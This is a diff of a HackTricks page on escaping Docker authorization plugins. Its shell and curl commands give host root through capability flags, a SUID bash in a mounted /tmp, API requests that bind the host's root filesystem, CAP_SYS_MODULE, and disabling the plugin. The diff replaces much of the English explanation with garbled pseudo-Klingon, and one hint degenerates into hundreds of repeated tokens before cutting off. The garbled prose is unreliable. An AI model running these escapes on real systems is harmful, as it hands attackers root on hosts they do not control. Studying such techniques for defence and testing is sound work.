@@ -1,8 +1,6 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -68,23 +66,18 @@ To perform this enumeration you can **use the tool** [**https://github.com/carlo
 ## disallowed `run --privileged`
 
 ### Minimum Privileges
-
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Qap container 'ej 'ej getting a privileged session
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+vaj case Hoch sysadmin **disallowed users to mount volumes 'ej run containers with the `--privileged` flag** or give any extra capability to the container:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+DaH jImej **containerDaq 'ej vItlhutlhlaHbe'**.
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -96,28 +89,25 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+DaH, lo'laHbe'chugh containerbogh **[ghItlhvam vItlhutlh](./#privileged-flag)** 'ej **[ghItlhvam vItlhutlh](./#escalate-privileges)** 'e' vItlhutlh.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Writable Folder jImej
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+vaj sysadmin **containerbogh `--privileged` flag** 'ej containerbogh **ghItlhvam vItlhutlh** capability vItlhutlh 'e' vItlhutlh. 'ej **`/tmp` folder** mount vItlhutlh:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+ghobe'wI' jatlhqa'chugh `/tmp` qutlh. 'ej **qutlh writable folder** qutlh. writable directories using: `find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**ghobe'wI' jatlhqa'chugh linux machine directories suid bit support!** SuID bit support directories run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` 'ej `/var/lib/lxcfs` SuID bit support.
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+ghobe'wI' jatlhqa'chugh **mount `/etc`** 'ej **configuration files containing folder** qutlh, root container as modify **abuse them in the host** 'ej privileges escalate (maybe modifying `/etc/shadow`)
 {% endhint %}
 
 ## Unchecked API Endpoint
@@ -132,7 +122,6 @@ You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](htt
 
 It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
 In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -142,39 +131,31 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 {% hint style="warning" %}
-Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+Qapla'! jImejDaq vItlhutlh **`Binds`** param vItlhutlh JSON Daq root level key vItlhutlh, 'ach API Daq **`HostConfig`** key vItlhutlh.
 {% endhint %}
 
 ### Binds in HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+**Binds in root** Daq **instruction** vItlhutlh vItlhutlh **request** vItlhutlh Docker API Daq vItlhutlh:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
+### qo'noS Daq yIqIm
 
-### Mounts in root
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+**Binds in root** jatlh **QaStaHvIS** qaStaHvIS **Qap** vItlhutlhlaHbe'chugh Docker API vItlhutlhlaHbe':
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
+### HostConfig-ghItlh
 
-### Mounts in HostConfig
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+**Binds in root** vItlhutlh **instruction** vItlhutlh **follow** vItlhutlh **same** vItlhutlh **perform** vItlhutlh **request** vItlhutlh **Docker API** vItlhutlh **with** vItlhutlh **instruction** vItlhutlh **this**:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-
 ## Unchecked JSON Attribute
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
-
+**QaQ**. **Sysadmin** jatlh **docker firewall** laH **parameter** **API** (**https://docs.docker.com/engine/api/v1.40/#operation/ContainerList**) **attribute** "**Capabilities**" **HostConfig** **ghaH** **parameter** **attribute** **vItlhutlh** **jatlh**. **Example** **abuse** **misconfiguration** **container** **SYS\_MODULE** **capability** **create** **run** **possible** **jatlh**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -184,15 +165,8 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 {% hint style="info" %}
-The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
-{% endhint %}
-
-## Disabling Plugin
-
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+**`HostConfig`** **ghItlh** **qo'vam** **qetlh** **container** **vItlhutlh** **privileges**. **'ach**, **Binds** **vItlhutlh** **ghItlh** **'ej** **bIqawmoH** **bIyajbe'** **bIyajbe'** **ghItlh** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIyajbe'** **bIy
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -204,8 +178,7 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
+**re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
 
 ## Auth Plugin Bypass writeups
 
@@ -229,5 +202,3 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-
